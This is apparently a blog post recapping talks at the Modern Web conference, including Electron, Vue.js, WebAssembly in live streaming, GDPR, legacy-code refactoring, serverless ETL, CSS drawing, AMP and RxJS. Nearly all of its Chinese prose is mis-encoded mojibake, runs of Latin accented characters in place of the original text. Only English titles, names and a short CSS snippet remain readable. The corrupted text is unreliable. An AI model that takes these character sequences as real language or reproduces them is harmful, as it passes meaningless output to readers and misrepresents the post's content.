How We Ended Up With Electron - Felix Riesebergè¬›è€…ä¾†è‡ªæ–¼ Slackï¼Œç•¶åˆæ²’ä»”ç´°çœ‹ä»‹ç´¹åŸæœ¬ä»¥ç‚ºä»–è¦è¬› Electron åœ¨ Slack å…§æ‡‰ç”¨ç¢°åˆ°çš„å‘ä¹‹é¡çš„ï¼Œä½†å¾Œä¾†è¬›çš„å…§å®¹å°±æ˜¯å¾ˆåŸºæœ¬çš„ Electron ä»‹ç´¹ä»¥åŠå¸¶ä¾†ç°¡å–®çš„ live demoï¼Œåˆ©ç”¨ Monaco Editor åšå‡ºä¸€å€‹å¾ˆç°¡å–®çš„ Editor ä¸¦ä¸”ç¤ºç¯„å¦‚ä½•æ‰“åŒ…æˆå¯åŸ·è¡Œæª”ã€‚
å¦‚æœæ˜¯ä¹‹å‰æ²’ç¢°é Electron çš„äººæ‡‰è©²æœƒæ»¿å–œæ­¡é€™å ´çš„ï¼Œæ˜¯ä¸éŒ¯çš„å…¥é–€ä»‹ç´¹ã€‚
æˆ‘ç‚ºä»€éº¼é¸æ“‡ Vue.js - è¶™éŒ¦æ±Ÿ (å‹¾ä¸‰è‚¡å››)ä¾†è‡ªé˜¿é‡Œé›²çš„è¬›è€…ï¼ŒåŒæ™‚ä¹Ÿæ˜¯ Vue.js çš„åœ˜éšŠæˆå“¡ä¹‹ä¸€ã€‚
é€™å ´æ˜¯æˆ‘ç¬¬ä¸€å¤©æœ€å–œæ­¡çš„ä¸€å ´è­°ç¨‹ï¼Œä½œè€…å¾ä»¥å‰å·¥ä½œæ™‚å°±ç¢°åˆ°çš„ä¸€å€‹å•é¡Œé–‹å§‹è¬›ï¼Œæ‰¾äº†å¹¾ç¨®ç¾æœ‰çš„è§£æ±ºæ–¹æ³•éƒ½ä¸å¤ªæ»¿æ„ï¼Œå¾Œä¾†ç”¨ä¸€äº›å…¶ä»–æŠ€è¡“å¯«äº†ä¸€å€‹ç°¡å–®çš„ libraryï¼Œå¾Œä¾†æŸå¤©çœ‹åˆ° Vue.js çš„æ ¸å¿ƒæ¦‚å¿µè·Ÿä»–å¾ˆåƒï¼Œæœ‰ç¨®ä¸è¬€è€Œåˆçš„æ„Ÿè¦ºï¼Œå¾æ­¤ä»¥å¾Œå°±æ±ºå®šè¦ä½¿ç”¨ Vue äº†ï¼ˆé‚£æ™‚å€™æ‰ 2013 å¹´ï¼ŒVue çš„ç‰ˆæœ¬æ˜¯ v0.10ï¼‰
å¾Œä¾†è·ŸåŒäº‹æ¨å»£é€™å¥—ï¼Œä½†ä»–å€‘ä¸è²·å–®ï¼Œè¦ºå¾—é€™æ±è¥¿å¤ªæ–°è€Œä¸”åˆä¸æ˜¯ä»€éº¼å¤§å…¬å¸åšçš„ï¼Œä¸é¡˜æ„å»ç”¨å®ƒã€‚ä½†å„˜ç®¡å¦‚æ­¤ï¼Œä½œè€…é‚„æ˜¯ç”¨é¡å¤–çš„æ™‚é–“åœ¨å˜—è©¦ Vue.jsï¼Œä½†ä¸€é–‹å§‹ä¹Ÿç¢°åˆ°ä¸€äº›ç¨‹å¼ç¢¼çš„çµ„ç¹”å•é¡Œï¼ˆtemplate æ”¾ä¸€èµ·ã€CSS æ”¾ä¸€èµ·ï¼‰ï¼Œå¾Œä¾†ç™¼ç¾ vue-loader åˆå†æ¬¡ä¸è¬€è€Œåˆçš„è§£æ±ºäº†é€™å€‹å•é¡Œã€‚
å¾Œä¾†åˆ°äº† 2015ï¼ŒVue çš„è²å‹¢é–‹å§‹æ…¢æ…¢å£¯å¤§ï¼Œè€Œ React Native çš„å‡ºç¾ä¹Ÿè®“è¬›è€…æ€è€ƒèµ· Vue Native çš„å¯èƒ½æ€§ï¼Œå¾Œä¾†åœ¨å…¬å¸å…§å˜—è©¦äº†ä¸€å€‹è§£æ±ºæ–¹æ¡ˆä¸¦ä¸”è¢«å…¬å¸æ¡ç”¨ï¼Œçµ‚æ–¼åœ¨å…‰æ£ç¯€æ­£å¼é‹ç”¨åœ¨å¤©è²“é¦–é ï¼Œæ²’éŒ¯ï¼Œå°±æ˜¯ Weexã€‚
è€Œä¸€è·¯èµ°ä¾†çš„éç¨‹ä¸­è¬›è€…ä¹Ÿç™¼ç¾æœ‰æ™‚å€™å•é¡Œä¸¦ä¸åœ¨å·¥å…·æœ¬èº«ï¼Œè€Œåœ¨ç”Ÿæ…‹åœˆã€‚ä½ è¦æœ‰å¥½çš„ç¤¾ç¾¤ã€å¥½çš„æ–‡ä»¶æ‰èƒ½æŠŠæ•´å€‹ç”Ÿæ…‹ç³»å»ºç«‹èµ·ä¾†ï¼Œæ‰€ä»¥å¾Œä¾†å°±æ¯”è¼ƒå°ˆæ³¨åœ¨é€™å€‹æ–¹å‘ã€‚
å¾è¬›è€…çš„é€™æ®µæ­·ç¨‹å¯ä»¥çœ‹è¦‹ Vue.js çš„ç™¼å±•ï¼Œå¾ä¸€å€‹å°å°çš„ library è®Šåˆ°ç¾åœ¨æˆç‚ºä¸‰å¤§å‰ç«¯æ¡†æ¶ä¹‹ä¸€ï¼Œè‹¥æ˜¯ä¸€è·¯è·Ÿè‘—èµ°ä¾†çš„äººä¸€å®šå¾ˆæ„Ÿå‹•ã€‚æœ€å¾Œä¹Ÿè¬›äº†ä¸€äº› Vue ä¹‹å¾Œå¯èƒ½çš„ç™¼å±•ä»¥åŠ 3.0 æ­£åœ¨è¨è«–ä¹‹ä¸­ï¼Œæœ‰åœ¨é—œæ³¨ Vue çš„æœ‹å‹å¯ä»¥ç•™æ„ä¸€ä¸‹ã€‚
WebAssembly åœ¨å…¨æ°‘ç›´æ’­çš„æ‡‰ç”¨ - è¶™æ´‹ (Eros Zhao)ä¹‹å‰æœ‰åšéä¸€é»ç›´æ’­ï¼ˆé‚„å¯«äº†ä¸€é»ç­†è¨˜ï¼šç›´æ’­å”è­° hls ç­†è¨˜ï¼‰æ‰€ä»¥å°é€™å ´ç‰¹åˆ¥æœ‰èˆˆè¶£ï¼Œè½äº†ä¹‹å¾ŒæœçœŸæ²’å¤±æœ›ã€‚
ä¸€é–‹å§‹æœƒç”¨åˆ° WebAssembly æ˜¯å› ç‚ºä¸Šé¢å•èªªèƒ½ä¸èƒ½æ”¯æ´åœ¨ WeChat çš„ Webview æ’­æ”¾ï¼Ÿä½†ç¶“éèª¿æŸ¥ä¹‹å¾Œç™¼ç¾ WeChat åªæ”¯æ´ hls æ ¼å¼ï¼Œæœ€çŸ­ä¹Ÿæœƒæœ‰ 10 ç§’é˜çš„å»¶é²ï¼Œå°ç›´æ’­ä¾†èªªæ˜¯æ²’è¾¦æ³•æ¥å—çš„ï¼Œè€Œ MSE ä¹Ÿç„¡æ³•ä½¿ç”¨ï¼Œå¯ä»¥åˆ‡å…¥çš„å…©å€‹é»æ˜¯ WebGL è·Ÿ WebAudio API éƒ½æœ‰æ”¯æŒï¼Œæ‰€ä»¥å°±åœç¹è‘—é€™å€‹åˆ‡å…¥é»ä¾†æƒ³è§£æ±ºè¾¦æ³•ï¼Œçœ‹çœ‹æœ‰æ²’æœ‰å¯èƒ½åœ¨ JavaScript é€™å±¤è‡ªå·±è§£ç¢¼ç„¶å¾Œç”¨ä¸Šè¿°æåˆ°çš„å…©å€‹æ±è¥¿ä¸€å€‹æ’­æ”¾ç•«é¢ä¸€å€‹æ’­æ”¾è²éŸ³ã€‚
å¾Œä¾†æ‰¾åˆ°ä¸€å¥— library å«åšï¼šjsmpegï¼Œç™¼ç¾æ‡‰è©²æ˜¯å¯ä»¥é”æˆçš„ï¼Œä½†ä»ç„¶æœ‰å¾ˆå¤šæ±è¥¿æœ‰è‡ªå·±ä¾†ï¼Œä¾‹å¦‚èªª H264 çš„ç·¨è§£ç¢¼å™¨åœ¨ JavaScript ä¸Šé¢æ²’æœ‰æˆç†Ÿçš„è§£æ±ºæ–¹æ¡ˆä»¥åŠå¯èƒ½æœƒæœ‰æ•ˆèƒ½å•é¡Œï¼Œé€™æ™‚å€™å°±æ˜¯ WebAssembly ç™»å ´çš„æ™‚å€™äº†ï¼Œå¾Œä¾†å°±ç›´æ¥æ‹¿ C&#x2F;C++ çš„ä¾†æ”¹ä¸€æ”¹ compile æˆ WebAssemblyã€‚
é›–ç„¶æˆ‘æ²’ä»€éº¼åœ¨é—œæ³¨ WebAssemblyï¼Œä¸éæˆ‘è¦ºå¾—ä»¥å¾Œç”¨åˆ°çš„å ´åˆæ‡‰è©²æœƒè¶Šä¾†è¶Šå¤šï¼ˆä¸éæ‡‰è©²ä¹Ÿä¸æœƒå¤šåˆ°å“ªè£¡å»ï¼‰ï¼Œå¤§æ¦‚å°±åƒå¯« Android è·Ÿ JNI çš„é—œä¿‚å·®ä¸å¤šå§ï¼Œä½ ç¢°åˆ°ä¸€äº›åœ°æ–¹å¾ˆéœ€è¦æ•ˆèƒ½æˆ–æ˜¯è¦æ›´æœ‰å®‰å…¨æ€§ä¸€é»çš„è©±ï¼Œå°±ç”¨ JNI ä¾†å¯« C çš„ codeï¼Œæˆ‘è‡ªå·±å° WebAssembly çš„æ„Ÿè¦ºä¹Ÿæ˜¯é€™æ¨£ã€‚
A Modern Web Architecture for (GDPR) Compliance - æ›¾ç¾©å³° (Ant)ä»‹ç´¹äº†ä¸€ä¸‹ GDPR è£¡é¢åˆ°åº•æœ‰å“ªäº›æ¢æ¬¾ä»¥åŠä¼æ¥­æ‡‰è©²å¦‚ä½•éµå®ˆï¼Œå…¶å¯¦å° GDPR ä¹Ÿæœ‰å¾ˆå¤šä¸åŒé¢å‘çš„è¨è«–ï¼Œä¾‹å¦‚èªªæœ‰äº›å°ˆå®¶è¦ºå¾— GDPR çš„æ³•è¦å¤ªè¤‡é›œï¼Œæ ¹æœ¬æ²’æœ‰ä¼æ¥­èƒ½å¤  100% éµå®ˆï¼Œé‚„æœ‰äººæ¨å‡ºäº†å¹«å¿™ block ä¾†è‡ªæ­ç›Ÿçš„ IP çš„æœå‹™ï¼Œæ»¿æœ‰è¶£çš„ï¼ˆä½†æ²’ä»€éº¼ç”¨å°±æ˜¯äº†ï¼ŒGDPR ä¸åƒ…é™æ–¼æ­ç›Ÿ IPï¼‰ã€‚
ä¹‹å¾Œæœ‰è¬›åˆ°åœ¨ DevOps è£¡é¢åŠ ä¸Š Security çš„å…ƒç´ ï¼Œè®Šæˆ SecDevOpsï¼Œä¸éå¾Œé¢é€™æ•´æ®µæˆ‘æ²’æœ‰è½å¾—å¾ˆæ‡‚å°±æ˜¯äº†ï¼Œå° DevOps é€™å¡Šä¸å¤ªç†Ÿæ‚‰ã€‚ç¸½ä¹‹åœ¨é€™å ´æ¼”è¬›è£¡é¢å­¸åˆ°æ»¿å¤šè·Ÿ GDPR æœ‰é—œçš„æ±è¥¿ï¼Œæ»¿æœ‰è¶£çš„ã€‚
éºç•™ä»£ç¢¼ç¶“æ¿Ÿå­¸ - Terry Yinæˆ‘è¦ºå¾—é€™å ´çš„è¬›è€…å£æ¢è¶…å¥½ç„¶å¾Œä¹Ÿè¬›å¾—å¾ˆæœ‰è¶£ï¼Œä¸»è¦æ˜¯åœ¨è¬› Legacy code ä»¥åŠåœ¨é‡æ§‹æ™‚æ‡‰è©²æ³¨æ„çš„äº‹é …ã€‚è£¡é¢æœ‰æåˆ°ä¸€å¥ç¶“å…¸åè¨€ï¼šã€Œé«˜å…§èšï¼Œä½è€¦åˆã€ï¼Œè¬›è€…èªªè¨˜å¾—è‡¨æ­»å‰è¦æŠŠé€™å¥è©±å‚³çµ¦å­«å­ã€‚
ä½†æœ‰äº›äººä¸€å­¸åˆ°é€™äº›æ±è¥¿ä¹‹å¾Œå°±èµ°ç«å…¥é­”äº†ï¼Œä¸ç®¡æ˜¯ä»€éº¼éƒ½æœ‰é–‹å§‹è§£è€¦ï¼Œè¦ºå¾—é€™æ¨£å¾ˆå¸¥ï¼Œä½†åœ¨é«˜å…§èšè·Ÿä½è€¦åˆä¹‹ä¸­ï¼Œæ¯”è¼ƒé‡è¦çš„å…¶å¯¦æ˜¯å‰è€…ã€‚å› ç‚ºæ²’æœ‰é«˜å…§èšçš„è©±ä½ æ±è¥¿åˆ†æ•£å››è™•å¾ˆé›£ debugï¼Œå¯æ˜¯æ²’æœ‰è§£è€¦çš„è©±é ‚å¤šå°±æ±è¥¿æ··åœ¨ä¸€èµ·ï¼Œä½ è¦æ‹†é–‹çš„æ™‚å€™é‚„æ˜¯éš¨æ™‚éƒ½å¯ä»¥æ‹†é–‹ï¼Œç›¸è¼ƒä¹‹ä¸‹æœƒæ¯”è¼ƒå®¹æ˜“ä¸€é»ã€‚
ç›¸ä¿¡å¤§å®¶éƒ½æœ‰è·Ÿ Legacy code å¥®æˆ°çš„ä¸€äº›ç¶“é©—ï¼Œé€™æ¬¡çš„ Modern web é™¤äº†é€™å ´ä»¥å¤–ä¹Ÿæœ‰åˆ¥çš„æ˜¯åœ¨è¨è«–é¡ä¼¼çš„è­°é¡Œã€‚
å‚³çµ±å¦‚ä½•ç¿»æ–°ï¼Œç”¨Serverlessæ–°æ¶æ§‹æ”¹é€ å‚³çµ±è³‡æ–™åˆ†æETLï¼šä»¥åˆ©ç”¨ AWS Lambda Batch ç‚ºä¾‹ - æ¥Šç«‹å‰ (Bryan Yang)é€™å ´å¤§çˆ†æ»¿ï¼Œå…©å´èµ°é“éƒ½ç«™æ»¿äº†äººï¼Œæˆ‘å°é€™é ˜åŸŸå¾ˆé™Œç”Ÿï¼Œæ˜¯èª¤æ‰“èª¤æ’ä¹‹ä¸‹æ‰è½åˆ°é€™ä¸€å ´ï¼Œä¸éä¹Ÿè¦ºå¾—é€™å ´å¾ˆæ£’ã€‚
è¦è§£æ±ºçš„å•é¡Œå…¶å¯¦å°±æ˜¯è¦æä¾›çµ¦å…§éƒ¨ä½¿ç”¨è€…ä¸€å€‹ä»‹é¢ï¼Œè®“ä»–å€‘å¯ä»¥è¼¸å…¥ queryï¼Œæ¥è‘—æŠŠç¬¦åˆçš„è³‡æ–™å¾ AWS è½‰åˆ° GCP ä¸Šé¢ã€‚è½è‘—ä¾†å¾ˆå®¹æ˜“ï¼Œä½†ä»”ç´°ä¸€å€‹ä¸€å€‹æ­¥é©Ÿåˆ†æä¸‹ä¾†å°±æœƒç™¼ç¾å…¶å¯¦å¾ˆå¤šç´°ç¯€è¦æ³¨æ„ã€‚
ä¾‹å¦‚èªªä½ è¦æœ‰ä¸€å€‹å‰ç«¯åšä»‹é¢ã€ä¸€å€‹å¾Œç«¯å¯« Serverï¼Œé‚„è¦æœ‰ä¸€å€‹äººè² è²¬ç›£æ§ Server çš„ç‹€æ³ï¼Œç„¶å¾ŒæŠŠè³‡æ–™è½‰éå»ä¹Ÿå› ç‚ºæ ¼å¼ä¸äº’é€šçš„é—œä¿‚éœ€è¦é¡å¤–å†åšè½‰æª”ï¼Œè€Œä¸”æ¯ä¸€å€‹æ­¥é©Ÿéƒ½è¦ç›£æ§æ˜¯å¦æˆåŠŸï¼Œè¦æŠŠçµæœå†å›å‚³çµ¦ userã€‚
å¾Œä¾†è¬›è€…åœ¨ AWS ä¸Šé¢å°‹æ‰¾å¯ä»¥é‹ç”¨çš„æœå‹™ï¼Œæœ€å¾ŒæˆåŠŸç”¨ä¸€å¤§å † AWS çš„æœå‹™æŠŠé€™æ•´å€‹æµç¨‹ä¸²èµ·ä¾†ï¼Œæ˜¯ä¸€å€‹ Serverless çš„è§£æ±ºæ–¹æ¡ˆã€‚ä¾‹å¦‚èªªå‰ç«¯çš„éƒ¨åˆ†ç›´æ¥è®“ä½¿ç”¨è€…ç”¨ postman æ‰“ APIï¼Œå†ç”¨ API gateway æ¥è³‡æ–™å¾Œç”¨ lambda è™•ç†ï¼Œç”¨ Batch å»é–‹æ©Ÿå™¨è½‰æª”ï¼Œè½‰å®Œä¹‹å¾Œå†å» trigger Google çš„ Cloud function æŠŠè³‡æ–™æ¬é€²å»ï¼Œé€”ä¸­éƒ½ç”¨ CloudWatch ä¾†ç›£æ§ä¸¦ä¸”ç”¨ slack å›å‚³çµæœã€‚
çœ‹èµ·ä¾†æ»¿æ–¹ä¾¿çš„ä½†å…¶å¯¦ä¹Ÿæœ‰ç¼ºé»ï¼Œé‚£å°±æ˜¯æœ‰å¾ˆå¤šå…ƒä»¶ï¼Œä½ è¦äº†è§£æ¯ä¸€å€‹ service çš„ inputã€output ä»¥åŠä½¿ç”¨æ–¹æ³•ï¼Œå…¶å¯¦è¦èŠ±å¾ˆå¤šæ™‚é–“ï¼Œå†ä¾†èªè¨€æ˜¯ python è·Ÿ node.js æ··ç”¨ï¼Œå› ç‚ºæœ‰äº›ä¸æ”¯æ´ pythonã€‚ç™¼ç”Ÿå•é¡Œçš„æ™‚å€™ä¹Ÿå¾ˆé›£ debug å› ç‚ºå¤ªå¤šç’°ç¯€äº†ã€‚
From Traditional Web to Modern Web - è•­æ™Šè› (Neo)é€™å ´ä¹Ÿæ˜¯åœ¨è¬›å¦‚ä½•è·Ÿ Legacy code å¥®æˆ°ã€‚èµ·å› æ˜¯æ¯æ¬¡å¤§å®¶å»ä¸€äº› conf ä¹‹å¾Œéƒ½æœƒçœ‹åˆ°å¾ˆå¤šæ–°æ½®çš„æ±è¥¿ï¼Œå¯æ˜¯å›åˆ°å…¬å¸åªèƒ½é¢å°åå¹´å‰çš„æŠ€è¡“æ£§ï¼Œåœ¨ conf ä¸Šé¢å­¸åˆ°çš„å®Œå…¨éƒ½ç”¨ä¸ä¸Šï¼Œæ‰€ä»¥è¬›è€…å°±è¦æƒ³è¾¦æ³•ä¾†è§£æ±ºé€™å€‹å•é¡Œã€‚
å…¶å¯¦è¦å¼•ç”¨æ–°çš„æ±è¥¿ä¸ç”¨å®Œå…¨å¼•ç”¨ï¼Œä¸€æ¬¡å°±å…¨éƒ¨æ›æ‰ï¼Œè€Œæ˜¯å¯ä»¥æ…¢æ…¢ä¾†ã€‚è¬›è€…ç°¡å–®ç¤ºç¯„äº†ç”¨ Vue ä¾†å¯¦ä½œ PM äº¤ä»£çš„æ–°åŠŸèƒ½ï¼Œé †ä¾¿æŠŠç›¸é—œçš„ç¨‹å¼ç¢¼æ›äº†ä¸€ä¸‹ï¼Œé€™æ¨£æ…¢æ…¢æŠŠç¨‹å¼ç¢¼æ›æ‰ä¸€æ–¹é¢å¯ä»¥ä¿è­‰ç©©å®šæ€§ï¼Œå¦ä¸€æ–¹é¢ä¹Ÿå¯ä»¥å¼•å…¥æ–°çš„æŠ€è¡“ã€‚
ä¸éæˆ‘è‡ªå·±è¦ºå¾—å¯èƒ½æ›åˆ°ä¸€åŠçš„æ™‚å€™æœ€éº»ç…©ï¼Œä¸€åŠæ–°çš„ä¸€åŠèˆŠçš„ï¼Œå¯ä»¥é æœŸåˆ°æ‡‰è©²æœƒæœ‰ä¸€äº›å•é¡Œã€‚è€Œåœ¨ç½®æ›çš„éç¨‹ä¸­å…¶å¯¦å°±æœ‰ç¢°åˆ°å•é¡Œï¼Œä¾‹å¦‚èªª jQuery è·Ÿ Vue åœ¨æŸäº›åŠŸèƒ½ä¸Šä¸å¤ªç›¸å®¹ï¼Œä¾‹å¦‚èªª jQuery å¯èƒ½æœƒæŠŠä½ çš„ DOM åˆªæ‰ä¹‹é¡çš„ï¼Œé€™æ–¹é¢ä¹Ÿè¦ç‰¹åˆ¥æ³¨æ„ã€‚
ç”¨ CSS ç©å‡ºç„¡é™å¯èƒ½ï¼ - å“æ‰¿è³¢ (AarOn)é€™å ´è¶…æœ‰è¶£çš„ã€‚ç°¡å–®ä¾†èªªå°±æ˜¯ç”¨ CSS ä¾†ç•«ç•«ï¼Œç”¨ä¸€äº›å¾ˆåŸºæœ¬çš„å±¬æ€§æ­é…çµ„åˆå°±å¯ä»¥ç•«å‡ºå¾ˆå²å®³çš„æ±è¥¿ã€‚ä¾‹å¦‚èªªè¬›è€…ç•«äº†å–¬å·´é‚„ç•«äº†ä¸€ç¢—æ‹‰éºµã€‚
é›–ç„¶èªªèƒŒå¾ŒåŸç†æ‡‰è©²é€šäº†å°±ä¸é›£ï¼Œä½†æˆ‘è¦ºå¾—å°å·¥ç¨‹å¸«ä¾†èªªæœ€é›£çš„æ‡‰è©²æ˜¯ã€Œåˆ°åº•è¦ç•«ä»€éº¼ã€ï¼ŒåŒæ¨£æ˜¯ä¸€ç¢—æ‹‰éºµï¼Œæˆ‘ç›¸ä¿¡ç´”å·¥ç¨‹å¸«è·Ÿæœ‰è¨­è¨ˆèƒŒæ™¯çš„å·¥ç¨‹å¸«ç•«å‡ºä¾†çš„æ±è¥¿è³ªæ„Ÿä¹Ÿæ˜¯å·®å¾ˆå¤šï¼Œä¾‹å¦‚èªªå¯èƒ½å°±ä¸æœƒè€ƒæ…®åˆ°é™°å½±ä¹‹é¡çš„ã€‚
ç¸½ä¹‹æ˜¯ä¸€å ´å¾ˆæœ‰è¶£çš„è­°ç¨‹ï¼Œæœ‰èˆˆè¶£çš„ä¹Ÿå¯ä»¥åƒè€ƒçœ‹çœ‹è¬›è€…åœ¨ codepen ä¸Šé¢çš„ä½œå“ã€‚
å¾å¹³å°ã€åª’é«”åˆ°æ•¸æ“šå…¬å¸ï¼šPIXNET çš„æŠ€è¡“æ¶æ§‹æ¼”é€² - æ—ç‘ç”· (Jnlin)é€™å ´å°±æ˜¯åœ¨è¬› PIXNET çš„æ­·å²ï¼Œç›¸å°æ–¼å…¶ä»–å ´å…¶å¯¦æœƒæ¯”è¼ƒç„¡èŠä¸€é»ï¼ŒæŠ€è¡“çš„å«é‡ä¹Ÿæœƒæ¯”è¼ƒä½ã€‚æ¯”èµ·æŠ€è¡“ä¸Šé¢çš„æ¶æ§‹ï¼Œè«‡åˆ°çµ„ç¹”ä¸Šé¢çš„æ¶æ§‹æ¯”è¼ƒå¤šã€‚
åœ¨ä¸€é–‹é ­æ™‚è¬›è€…å°±æä¾›äº†ä¸€å€‹ç¶²ç«™é–‹æ”¾å¤§å®¶æå•ï¼Œæœ€é«˜ç¥¨çš„å…©å€‹å•é¡Œæ˜¯ï¼š

ç‚ºä»€éº¼å»£å‘Šé€™éº¼å¤š
å°é»‘å¸½ SEO ç™¼å¸ƒå‡æ–‡ç« æœ‰æ²’æœ‰ä»€éº¼æ‡‰å°æªæ–½ï¼Ÿ

æ¯æ¬¡åªè¦æœ‰ PIXNET çš„å ´åˆå°±æœƒè¢«å•åˆ°é€™äº›å•é¡Œï¼Œä»–å€‘æ‡‰è©²ä¹Ÿæœ‰é»ç¿’æ…£äº†ã€‚ç•¢ç«Ÿæƒ³åˆ° PIXNEXTï¼Œå¤§å®¶æƒ³åˆ°çš„ç¬¬ä¸€ä»¶äº‹æ‡‰è©²å°±æ˜¯è“‹æ¿å»£å‘Šã€‚
Modern Talk é–ƒé›»ç§€é–ƒé›»ç§€ä¸€ç›´éƒ½æ˜¯ä¸€å€‹åˆæ­¡æ¨‚åˆæœ‰è¶£çš„å–®å…ƒï¼Œä»Šå¹´ä¹Ÿä¸ä¾‹å¤–ã€‚ä¸éè¬›çš„äººæœ‰é»å¤šï¼Œæˆ‘å°±æŒ‘ä¸€å€‹æˆ‘å°è±¡æœ€æ·±åˆ»çš„ã€‚
ä¾†è‡ªè¶¨å‹¢ç§‘æŠ€çš„å±±å§†å¤§å”çµ¦çš„è¬›é¡Œï¼šGraphQL in 5 minsï¼Œä¸»è¦æ˜¯å› ç‚ºå¾ˆå¤šäººé›–ç„¶éƒ½å° GraphQL æœ‰èˆˆè¶£ï¼Œä½†æœ€éº»ç…©çš„ä¸€é»é‚„æ˜¯åŸä¾†é‚£ä¸€å¤§å †çš„ RESTful API è¦æ€éº¼è¾¦ï¼Ÿå…¶å¯¦å¯ä»¥å…ˆç”¨ä¸€äº›æŠ€å·§è®“å‰ç«¯ç”¨ GraphQLï¼Œå¯æ˜¯å¾Œç«¯é‚„æ˜¯ RESTful APIï¼Œé›–ç„¶æ„Ÿè¦ºå¾ˆé«’ä½†ä¹Ÿæ²’è¾¦æ³•ï¼Œä¸å¤±ç‚ºä¸€å€‹è§£æ±ºæ–¹æ³•ã€‚
å£æ¢å¾ˆå¥½ä¹Ÿå¾ˆå¹½é»˜ï¼Œæœ‰è‡´æ•¬ç¬¬ä¸€å¤©çš„è¬›è€…é‚„æœ‰å¼•ç¶“æ“šå…¸ï¼Œæ²’è½åˆ°é€™å ´çš„çœŸçš„å¯æƒœï¼Œ
SOLO - æç¶­ç¿°(Paul Li)Modern Web çš„å£“è»¸ã€‚
å¤§æ¦‚å…©ä¸‰å¹´å‰åœ¨ JSDC é‚„æ˜¯å“ªé‚Šå°±æœ‰è½é Paul çš„æ¼”è¬›ï¼ŒçœŸçš„æ˜¯å¾ˆæœ‰æ¸²æŸ“åŠ›ä»¥åŠå€‹äººé¢¨æ ¼å¼·çƒˆçš„æ¼”èªªã€‚é€™æ¬¡è¬›çš„é¡Œç›®æ˜¯ä»–æœ€è¿‘ä¸€ç›´åœ¨ç ”ç©¶çš„ AMPï¼Œå…¶å¯¦æˆ‘åˆ°é‚£ä¹‹å‰éƒ½ä¸€ç›´ä»¥ç‚º AMP å°±æ˜¯ä¸€å€‹ä½ ç”¨äº†ä¹‹å¾Œå°±å¯ä»¥åœ¨ Google æœå°‹çµæœä¸Šé¢æ’åè®Šé«˜ç„¶å¾Œæœƒæœ‰æ¯”è¼ƒåŸç”Ÿçš„é«”é©—ã€‚
ä½†è½äº†ä¸€äº›æ±è¥¿ä¹‹å¾Œç™¼ç¾é€™åªæ˜¯ AMP çš„å…¶ä¸­ä¸€å€‹é¢å‘ï¼Œå…¶å¯¦ä»–å¯ä»¥åšåˆ°çš„æ›´å¤šæ›´å»£ï¼Œæ‡‰è©²è¦æ‰¾å€‹æ™‚é–“ä¾†å¥½å¥½ç ”ç©¶ä¸€ä¸‹ AMPã€‚
é€™å ´ä»‹ç´¹äº†æ»¿å¤š AMP ç›¸é—œçš„æ‡‰ç”¨ä»¥åŠå¦‚ä½•ç”¨ç¾æœ‰çš„ AMP å…ƒä»¶çµ„åˆå‡ºå…¶ä»–åŠŸèƒ½ï¼Œä½†å…¶å¯¦æˆ‘å°è±¡æœ€æ·±åˆ»çš„åè€Œè·Ÿ AMP ç„¡é—œï¼Œæœ‰ä¸€å€‹æˆ‘è¦ºå¾—å¾ˆé…·çš„å°±æ˜¯ input çš„ suggestion é‚£å€‹åŠŸèƒ½ï¼Œå¹³å¸¸å¤§å®¶æ‡‰è©²æ˜¯ç”¨ JavaScript ä¾†æ§åˆ¶è¦ä¸è¦é¡¯ç¤º suggestion çš„é¸å–®ï¼Œé€™æ¬¡å­¸åˆ°äº†å±…ç„¶å¯ä»¥ç”¨ CSS ä¾†æ§åˆ¶ï¼
input:placeholder-shown ~ .suggestion &#123;  display: none;&#125;

å¦‚æœ placeholder æœ‰é¡¯ç¤ºçš„è©±å°±ä»£è¡¨ input æ˜¯ç©ºçš„ï¼Œå°±æŠŠ suggestion ç”¨ CSS éš±è—æ‰ï¼Œé«˜æ‹›ï¼
è¼•é¬†æ‡‰ä»˜è¤‡é›œçš„éåŒæ­¥æ“ä½œï¼šRxJS Redux Observable - èƒ¡ç«‹ (huli)é€™æˆ‘è‡ªå·±çš„è­°ç¨‹æ‰€ä»¥æ”¾æœ€å¾Œè¬›ã€‚
åœ¨å‰ä¸€å¤©æˆ‘æœ‰å…ˆæŠŠç°¡å ±æ”¾ä¸Šå» Facebook çš„ç¤¾åœ˜ï¼Œå› ç‚ºæˆ‘ä»¥å‰åœ¨è½ conf çš„æ™‚å€™éƒ½å¾ˆå¸Œæœ›è¬›è€…èƒ½å¤ åœ¨ä¸€é–‹å§‹å°±æŠŠç°¡å ±æª”çš„é€£çµå…¬å¸ƒï¼Œä¸ç„¶æœ‰äº›æ¯”è¼ƒå°çš„åœ–ç‰‡å…¶å¯¦åº•ä¸‹çš„äººæ ¹æœ¬çœ‹ä¸æ¸…æ¥šï¼Œå› ç‚ºè·é›¢å¯¦åœ¨æ˜¯å¤ªé ã€‚
æœ‰äº›äººæ²’è¾¦æ³•é€™æ¨£åšæ˜¯å› ç‚ºç°¡å ±è£¡é¢æœ‰ä¸€äº›æ¢—ï¼Œææ—©ç ´æ¢—å°±ä¸æœ‰è¶£äº†ï¼Œä¸éæˆ‘çš„ç°¡å ±æ²’ä»€éº¼æ¢—æ‰€ä»¥æ²’å·®ï¼Œå°±åœ¨æ¼”è¬›å‰ä¸€å¤©å…¬å¸ƒäº†ï¼Œä¹Ÿå¯ä»¥é †ä¾¿è®“å¤§å®¶è‡ªå·±çœ‹çœ‹å°é€™å ´è­°ç¨‹æœ‰æ²’æœ‰èˆˆè¶£ã€‚
äº‹å‰å¤§æ¦‚æœ‰æ¼”ç·´å€‹å…©ä¸‰æ¬¡ï¼Œçœ‹ä¸€ä¸‹è‡ªå·±è¦è¬›ä»€éº¼ä»¥åŠæŠ“ä¸€ä¸‹æ™‚é–“ï¼Œä½†çœŸçš„ç«™ä¸Šå°å°±æ˜¯è…¦å­ä¸€ç‰‡ç©ºç™½ï¼Œå…¶å¯¦è¬›ä»€éº¼éƒ½æ˜¯é ç›´è¦ºçš„ï¼Œæ²’ä»€éº¼é¤˜åŠ›æ€è€ƒï¼Œç•¢ç«Ÿä½ ä¸€ä½†åœæ­¢è¬›è©±äº†ï¼Œå°±æ•´å€‹æœƒå ´éƒ½æ²’è²éŸ³äº†ï¼Œä¸éé©æ™‚çš„ç•™ç™½æ‡‰è©²é‚„æ˜¯ OKã€‚
